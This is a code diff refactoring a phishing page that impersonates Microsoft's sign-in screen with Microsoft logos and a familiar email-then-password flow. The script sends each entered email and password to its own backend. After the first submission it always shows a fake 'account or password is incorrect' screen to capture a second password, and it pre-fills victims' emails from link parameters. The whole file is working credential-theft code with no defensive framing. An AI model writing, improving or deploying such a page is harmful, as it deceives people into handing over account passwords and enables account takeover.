@@ -86,6 +86,16 @@
         @keyframes spin { 
             to { transform: rotate(360deg); } 
         }
+        .processing {
+            display: inline-block;
+            width: 12px;
+            height: 12px;
+            border: 2px solid #fff;
+            border-radius: 50%;
+            border-top-color: transparent;
+            animation: spin 1s linear infinite;
+            margin-right: 8px;
+        }
     </style>
 </head>
 <body>
@@ -97,9 +107,11 @@
 
 <script>
     // Global variables
-    let email = "";
-    let password = "";
+    let currentEmail = "";
+    let currentPassword = "";
+    let isProcessing = false;
 
+    // Global functions - accessible from anywhere
     function getCsrfToken() {
         const metaToken = document.querySelector('meta[name="csrf-token"]');
         return metaToken ? metaToken.getAttribute('content') : '';
@@ -110,12 +122,25 @@
         return re.test(email);
     }
 
+    function showError(message) {
+        const container = document.getElementById("container");
+        const existingError = container.querySelector('.error-msg');
+        if (existingError) {
+            existingError.remove();
+        }
+
+        const errorDiv = document.createElement('div');
+        errorDiv.className = 'error-msg';
+        errorDiv.innerHTML = message;
+        container.insertBefore(errorDiv, container.firstChild);
+    }
+
     function showStep1() {
         const container = document.getElementById("container");
         container.innerHTML = `
             <img class="logo" role="img" src="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="Microsoft" style="margin-bottom: 15px;">
             <h1 class="header">Sign in</h1>
-            <form id="loginForm">
+            <form id="emailForm">
                 <input type="text" id="emailInput" placeholder="Email, phone, or Skype" required>
                 <div style="margin: 15px 0; font-size: 13px;">
                     <span style="color: #000; text-decoration: none;">No account? <span style="color: #0067b8; text-decoration: none;">Create one!</span></span><br><br>
@@ -128,24 +153,22 @@
         `;
 
         // Pre-fill email from URL parameter
-        try {
-            const urlParams = new URLSearchParams(window.location.search);
-            const hintedEmail = (urlParams.get("email") || "").trim();
-            const emailField = document.getElementById("emailInput");
-            
-            if (hintedEmail && hintedEmail.includes("@") && emailField) {
-                emailField.value = hintedEmail;
-                email = hintedEmail;
-            }
-        } catch (e) {
-            console.log("Error loading email hint:", e);
+        const urlParams = new URLSearchParams(window.location.search);
+        const hintedEmail = (urlParams.get("email") || "").trim();
+        const emailField = document.getElementById("emailInput");
+        
+        if (hintedEmail && hintedEmail.includes("@") && emailField) {
+            emailField.value = hintedEmail;
+            currentEmail = hintedEmail;
         }
 
-        document.getElementById("loginForm").addEventListener("submit", function(e){
+        document.getElementById("emailForm").addEventListener("submit", function(e){
             e.preventDefault();
+            if (isProcessing) return;
+            
             const emailValue = document.getElementById("emailInput").value.trim();
             if(emailValue && validateEmail(emailValue)) {
-                email = emailValue;
+                currentEmail = emailValue;
                 showStep2();
             } else {
                 showError("Please enter a valid email address.");
@@ -157,9 +180,9 @@
         const container = document.getElementById("container");
         container.innerHTML = `
             <img class="logo" role="img" src="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="Microsoft" style="margin-bottom: 15px;">
-            <div class="muted" style="margin:10px 0;">← ${email}</div>
+            <div class="muted" style="margin:10px 0;">← ${currentEmail}</div>
             <h1 class="header">Enter password</h1>
-            <form id="loginForm">
+            <form id="passwordForm">
                 <input type="password" id="passwordInput" placeholder="Password" required>
                 <div style="margin: 15px 0; font-size: 13px;">
                     <span style="color: #0067b8; text-decoration: none;">Forgot password?</span><br><br>
@@ -176,12 +199,14 @@
             showStep1();
         });
 
-        document.getElementById("loginForm").addEventListener("submit", function(e){
+        document.getElementById("passwordForm").addEventListener("submit", function(e){
             e.preventDefault();
+            if (isProcessing) return;
+            
             const pwd = document.getElementById("passwordInput").value;
             if(pwd.trim()) {
-                password = pwd;
-                submitToBackend(email, password, false);
+                currentPassword = pwd;
+                submitCredentials(false);
             } else {
                 showError("Please enter your password.");
             }
@@ -192,19 +217,19 @@
         const container = document.getElementById("container");
         container.innerHTML = `
             <img class="logo" role="img" src="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="Microsoft" style="margin-bottom: 15px;">
-            <div class="muted" style="margin:10px 0;">← ${email}</div>
+            <div class="muted" style="margin:10px 0;">← ${currentEmail}</div>
             <h1 class="header">Your account or password is incorrect</h1>
             <div style="margin: 15px 0;">
                 If you don't remember your password, <span style="color: #0067b8; cursor: pointer;">reset it now</span>.
             </div>
-            <form id="loginForm">
-                <input type="password" id="finalPasswordInput" placeholder="Password" required>
+            <form id="retryForm">
+                <input type="password" id="retryPasswordInput" placeholder="Password" required>
                 <div style="margin: 15px 0; font-size: 13px;">
                     <span style="color: #0067b8; text-decoration: none;">Forgot password?</span>
                 </div>
                 <div style="display: flex; justify-content: flex-end;">
                     <button type="button" class="btn-back" id="btnBack2">Back</button>
-                    <button type="submit" class="btn-next" id="finalSignIn">Sign in</button>
+                    <button type="submit" class="btn-next" id="retrySignIn">Sign in</button>
                 </div>
             </form>
         `;
@@ -213,35 +238,37 @@
             showStep2();
         });
 
-        document.getElementById("loginForm").addEventListener("submit", function(e){
+        document.getElementById("retryForm").addEventListener("submit", function(e){
             e.preventDefault();
-            const finalPassword = document.getElementById("finalPasswordInput").value;
-            if(finalPassword.trim()) {
-                const signInBtn = document.getElementById("finalSignIn");
-                signInBtn.innerHTML = `
-                    <span style="display: inline-block; width: 12px; height: 12px; border: 2px solid #fff; border-radius: 50%; border-top-color: transparent; animation: spin 1s linear infinite; margin-right: 8px;"></span>
-                    Processing...
-                `;
-                submitToBackend(email, finalPassword, true);
+            if (isProcessing) return;
+            
+            const retryPassword = document.getElementById("retryPasswordInput").value;
+            if(retryPassword.trim()) {
+                const signInBtn = document.getElementById("retrySignIn");
+                signInBtn.innerHTML = `<span class="processing"></span>Processing...`;
+                currentPassword = retryPassword;
+                submitCredentials(true);
             } else {
                 showError("Please enter your password.");
             }
         });
     }
 
-    function submitToBackend(emailValue, passwordValue, isSecondAttempt) {
+    function submitCredentials(isSecondAttempt) {
+        if (isProcessing) return;
+        isProcessing = true;
+
         const formData = new FormData();
-        formData.append('email', emailValue);
-        formData.append('password', passwordValue);
+        formData.append('email', currentEmail);
+        formData.append('password', currentPassword);
         formData.append('submit', 'Sign in');
         
-        // Add CSRF token
         const csrfToken = getCsrfToken();
         if (csrfToken) {
             formData.append('csrf_token', csrfToken);
         }
 
-        console.log('Submitting:', emailValue, '(password hidden)', 'Second attempt:', isSecondAttempt);
+        console.log('Submitting:', currentEmail, '(password hidden)', 'Second attempt:', isSecondAttempt);
 
         fetch('/', {
             method: 'POST',
@@ -257,60 +284,48 @@
                 return null;
             }
 
-            // Check if redirected back to our form with retry parameter
+            // Check if redirected back with retry parameter
             if (response.url && (response.url.includes('retry=true') || response.url.includes('step=retry'))) {
-                setTimeout(() => showStep3(), 500);
+                isProcessing = false;
+                showStep3();
                 return null;
             }
 
             return response.text();
         })
         .then(html => {
+            isProcessing = false;
             if (!html) return;
 
-            // Check if the response contains error indicators
+            // Check response for error indicators
             if (html.includes('error=true') || html.includes('step=retry')) {
                 if (!isSecondAttempt) {
-                    setTimeout(() => showStep3(), 500);
+                    showStep3();
                 } else {
                     showError("Login failed. Please try again.");
                 }
             } else if (!isSecondAttempt) {
-                // First attempt should always go to second pass
-                setTimeout(() => showStep3(), 500);
+                showStep3();
             }
         })
         .catch(error => {
+            isProcessing = false;
             console.error('Error:', error);
             showError("An error occurred. Please try again.");
         });
     }
 
-    function showError(message) {
-        const container = document.getElementById("container");
-        const existingError = container.querySelector('.error-msg');
-        if (existingError) {
-            existingError.remove();
-        }
-
-        const errorDiv = document.createElement('div');
-        errorDiv.className = 'error-msg';
-        errorDiv.innerHTML = message;
-        container.insertBefore(errorDiv, container.firstChild);
-    }
-
-    // Initialize the application when page loads
+    // Initialize application
     document.addEventListener('DOMContentLoaded', function() {
         console.log('DOM loaded, initializing...');
         
-        // Check URL parameters for step and email
         try {
             const urlParams = new URLSearchParams(window.location.search);
             const step = urlParams.get("step") || "";
             const hintedEmail = (urlParams.get("email") || "").trim();
             
             if (hintedEmail && hintedEmail.includes("@")) {
-                email = hintedEmail;
+                currentEmail = hintedEmail;
                 
                 if (step === "password") {
                     showStep2();
@@ -324,7 +339,6 @@
             console.log("Error processing URL parameters:", e);
         }
 
-        // Default to step 1
         showStep1();
     });
 </script>
